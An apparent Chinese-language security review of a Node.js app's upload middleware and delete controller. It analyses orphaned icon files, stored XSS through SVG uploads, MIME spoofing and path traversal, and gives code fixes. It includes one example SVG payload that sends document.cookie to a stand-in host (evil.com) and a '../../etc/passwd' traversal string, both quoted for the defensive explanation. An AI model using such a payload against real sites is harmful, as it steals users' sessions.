# 应用删除与图标上传模块安全性分析

## 概述

本文针对 `middleware/multer.js` 与 `controllers/apps/deleteApp.js` 两个模块存在的设计缺陷进行深入分析，并提出改进方案。

---

## 1. 应用删除时未清理图标文件导致的孤儿文件问题

### 1.1 问题根源

孤儿文件的成因并不仅限于应用删除，更新应用图标同样会触发。

#### 1.1.1 删除路径

在 [deleteApp.js](file:///e:/solo-code-2/flame/controllers/apps/deleteApp.js) 中，删除应用仅调用了 ORM 的销毁方法：

```js
await App.destroy({
  where: { id: req.params.id },
});
```

#### 1.1.2 更新路径（被遗漏的泄漏源）

在 [updateApp.js](file:///e:/solo-code-2/flame/controllers/apps/updateApp.js#L23-L26) 中：

```js
if (req.file) {
  body.icon = req.file.filename;
}

app = await app.update(body);
```

当用户通过 `PUT /api/apps/:id` 上传新的图标时：

1. [multer.js#L12-L14](file:///e:/solo-code-2/flame/middleware/multer.js#L12-L14) 以 `Date.now() + '--' + file.originalname` 生成**全新**的文件名写入磁盘。
2. 数据库中的 `icon` 字段被覆盖为新文件名。
3. 原有的旧图标文件仍留在 `data/uploads` 目录下，但系统已经丢失了对它的任何引用。

与删除场景的不同之处在于：更新操作会保留应用记录本身，因此旧文件名不会出现在任何数据库行中——它在磁盘上彻底"隐形"。这使得定期通过数据库比对清理的成本反而更高。

#### 1.1.3 共同的核心缺陷

无论是删除还是更新，数据库记录与磁盘文件之间都没有建立级联清理关系。`App.destroy` 与 `app.update(body)` 只会修改数据库中的元组，**不会触发任何对 `data/uploads` 目录下对应物理文件的删除操作**。

数据库中通常会保存一个指向该文件的字段（如 `icon`），其值类似 `20240101--app-icon.png`。一旦该记录被删除或被覆盖，这个文件名就再也无法被系统引用，但物理文件却永远留在了磁盘上。

### 1.2 对宿主机磁盘空间的隐患

随着时间推移，这种"孤儿文件"泄漏会带来一系列严重隐患：

1. **磁盘空间耗尽（Disk Exhaustion）**：每次上传都会产生一个新文件，每次删除又不会回收，磁盘占用呈单调递增趋势。长时间运行后可能导致宿主机分区写满，引发数据库写入失败、日志无法落盘、服务崩溃等连锁故障。
2. **备份成本与时间膨胀**：备份程序（如 rsync、对象存储快照）会将这些无用文件一并备份，增加存储成本与备份窗口。
3. **取证与合规风险**：残留的图标可能包含用户敏感信息（品牌 Logo 等），在数据销毁合规（如 GDPR "被遗忘权"）场景下构成违规。
4. **信息泄露面扩大**：若文件命名规则可被猜测，攻击者可直接访问历史遗留文件，获取已下架应用的品牌资产。
5. **运维噪声**：监控告警（磁盘使用率）持续触发，排障成本上升。

---

## 2. SVG 文件上传与存储型 XSS 风险

### 2.1 放行逻辑分析

在 [multer.js#L17-L20](file:///e:/solo-code-2/flame/middleware/multer.js#L17-L20)：

```js
const supportedTypes = ['jpg', 'jpeg', 'png', 'svg', 'svg+xml', 'x-icon'];

const fileFilter = (req, file, cb) => {
  if (supportedTypes.includes(file.mimetype.split('/')[1])) {
    cb(null, true);
  } else {
    cb(null, false);
  }
};
```

当客户端上传 `image/svg+xml` 类型文件时：

- `file.mimetype` 为 `"image/svg+xml"`
- `file.mimetype.split('/')[1]` 得到 `"svg+xml"`
- `supportedTypes` 白名单中包含 `"svg+xml"`

**因此该文件会被直接放行。**

注意：该值完全来自于客户端请求中的 `Content-Type`，攻击者可在 multipart 请求中随意伪造，服务端没有做任何基于文件魔数（magic bytes）的二次校验。

### 2.2 托管静态 SVG 引发的存储型 XSS

SVG 本质上是 XML，支持嵌入 `<script>`、事件处理器（`onload`、`onclick` 等）、外部实体、CSS 表达式等执行上下文。若服务器将上传的 SVG 作为静态资源直接托管，并以 `Content-Type: image/svg+xml` 响应：

- 浏览器会解析并执行其中的 JavaScript，形成 **存储型 XSS（Stored XSS）**。
- 攻击者可以构造如下 payload：

```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.com/steal?c='+document.cookie)">
  <script>alert(document.domain)</script>
</svg>
```

可能造成的危害：

1. **会话劫持**：读取 `document.cookie`、`localStorage`，将受害者凭证外传。
2. **CSRF Token 窃取**：在受害者上下文中读取页面内敏感数据。
3. **钓鱼 & 点击劫持**：渲染仿冒界面，诱导用户输入凭据。
4. **同源资源访问**：利用 XHR/fetch 读取站内受保护接口的数据。
5. **供应链投毒**：若该 SVG 被后台管理员查看，可能导致后台权限被接管。

此外，由于文件名保留了 `file.originalname`（第 13 行），若原始名包含 `../` 等目录穿越片段，在部分静态服务器配置下还可能构成 **任意文件覆盖 / 路径遍历**。

---

## 3. 改进方案

### 3.1 删除应用时同步清理图标文件

**改造 `controllers/apps/deleteApp.js`**：在调用 `App.destroy` 之前，先查询数据库获取图标路径，再安全地拼接并执行物理删除。

```js
const asyncWrapper = require('../../middleware/asyncWrapper');
const App = require('../../models/App');
const fs = require('fs');
const path = require('path');

const UPLOAD_DIR = path.resolve(__dirname, '..', '..', 'data', 'uploads');

const deleteApp = asyncWrapper(async (req, res, next) => {
  const app = await App.findOne({
    where: { id: req.params.id },
    attributes: ['id', 'icon'],
  });

  if (!app) {
    return res.status(404).json({ success: false, message: 'App not found' });
  }

  if (app.icon) {
    const iconPath = path.join(UPLOAD_DIR, path.basename(app.icon));
    fs.unlink(iconPath, (err) => {
      if (err && err.code !== 'ENOENT') {
        console.error('Failed to remove icon:', err);
      }
    });
  }

  await App.destroy({ where: { id: req.params.id } });

  res.status(200).json({ success: true, data: {} });
});

module.exports = deleteApp;
```

### 3.2 路径遍历防护策略

使用 `fs.unlink` 时必须防范路径遍历（Path Traversal）。攻击向量：若 `app.icon` 字段被污染为 `../../etc/passwd`，直接传入 `fs.unlink` 会删除目标目录外的任意文件。

**关键防御措施**：

1. **使用 `path.basename()` 剥离目录层级**：无论传入值包含多少 `../`，`basename` 都只返回最后一级文件名。
2. **使用 `path.join()` + `path.resolve()` 构造绝对路径**：避免相对路径被解释为意外位置。
3. **校验最终路径仍在上传目录内**（深度防御）：

```js
const safeName = path.basename(app.icon);
const targetPath = path.resolve(UPLOAD_DIR, safeName);

if (!targetPath.startsWith(UPLOAD_DIR + path.sep)) {
  return next(new Error('Invalid icon path'));
}

fs.unlink(targetPath, ...);
```

4. **上传阶段一并规范化**：在 `multer.js` 的 `filename` 回调中，对 `file.originalname` 做 `path.basename` 与白名单字符过滤，从源头杜绝危险文件名。

### 3.3 禁止 SVG 或在上传时无害化

根据业务需求二选一：

**方案 A：直接拒绝 SVG（推荐，风险最低）**

```js
const supportedTypes = ['jpg', 'jpeg', 'png', 'x-icon'];
```

若必须保留 SVG，则需：

**方案 B：服务端渲染为位图（rasterize）**

使用 `sharp`、`librsvg` 等库在服务端将 SVG 渲染为 PNG/JPEG，然后仅保留光栅化结果。这会彻底剥离脚本与事件处理器。

**方案 C：基于白名单的 SVG 净化（Sanitization）**

使用 `DOMPurify` 或 `svg-sanitizer` 对上传的 SVG 进行 DOM 级过滤，移除 `<script>`、事件属性、外部引用、`javascript:` 伪协议等危险元素。示例：

```js
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

const cleanSvg = DOMPurify.sanitize(rawSvg, {
  USE_PROFILES: { svg: true },
  FORBID_ATTR: ['onload', 'onclick', 'onmouseover', ...],
});
```

### 3.4 托管层加固

即使做了上传过滤，仍需在静态资源托管层进行纵深防御：

1. **设置严格的 `Content-Type`**：确保返回类型为 `image/svg+xml` 且非 `text/html`。
2. **添加 `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; sandbox`** 等响应头，阻止 SVG 内部脚本执行与网络访问。
3. **`X-Content-Type-Options: nosniff`**：防止浏览器基于内容猜测覆盖 MIME。
4. **`X-Frame-Options: DENY`** 与 `Referrer-Policy`：降低被嵌入与信息泄露风险。
5. **将静态资源托管在独立的无 cookie 子域（如 `static.example.com`）**，即便发生 XSS 也无法访问主域 Cookie。

### 3.5 MIME 类型校验加固

当前校验仅基于客户端声明的 `mimetype`，不可靠。建议：

- 使用 `file-type` 库对文件流进行魔数（magic number）检测，基于真实内容而非头信息。
- 在 `fileFilter` 中同时校验扩展名与 MIME。

```js
const { fromBuffer } = require('file-type');
// 在 storage 或自定义 stream 校验中执行
const type = await fromBuffer(buffer);
if (!type || !['jpg', 'png', 'jpeg'].includes(type.ext)) {
  return cb(new Error('Unsupported file type'));
}
```

---

## 4. 改进清单汇总

| 编号 | 改进项 | 所属模块 | 优先级 |
|------|--------|----------|--------|
| 1 | 删除应用时同步删除物理图标文件 | `controllers/apps/deleteApp.js` | 高 |
| 2 | `path.basename` + 路径前缀校验防遍历 | `controllers/apps/deleteApp.js` | 高 |
| 3 | 上传文件名规范化（`basename` + 白名单字符） | `middleware/multer.js` | 高 |
| 4 | 白名单移除 `svg` / `svg+xml`，或服务端渲染/净化 | `middleware/multer.js` | 高 |
| 5 | 基于魔数的文件类型二次校验 | `middleware/multer.js` | 中 |
| 6 | 静态资源响应头加固（CSP、nosniff 等） | 静态托管层 | 中 |
| 7 | 静态资源独立子域托管 | 运维/部署 | 中 |
| 8 | 定期清理孤儿文件的守护任务（cron） | 运维 | 低 |

---

## 5. 结论

- **孤儿文件泄漏**源于数据库与磁盘状态的不一致，不仅发生在删除应用时，**更新应用图标**同样会使旧文件"隐形"，必须在业务层对两条路径同步清理，否则会持续吞噬磁盘并引发合规风险。
- **SVG 存储型 XSS** 源于对上传内容缺乏结构化校验与无害化处理。SVG 作为 XML 载体可执行脚本，必须从输入过滤、服务端净化、响应头加固等多层进行防御。
- **MIME 伪造绕过**：当前 `fileFilter` 仅依赖客户端声明的 `mimetype`，攻击者可伪造 `image/png` 但上传 `.html` 文件，最终以 `Date.now()--evil.html` 落盘，静态托管时被解析为 HTML 形成存储型 XSS。必须引入"魔数检测 + 扩展名与 MIME 一致性校验 + 强制规范化扩展名"三位一体的加固策略。
- **路径遍历**是任何涉及文件操作代码的固有风险，必须以 `path.basename` + 目录前缀校验为最小化安全实践。

按上述方案改造后，可显著降低该模块的安全风险与运维负担。
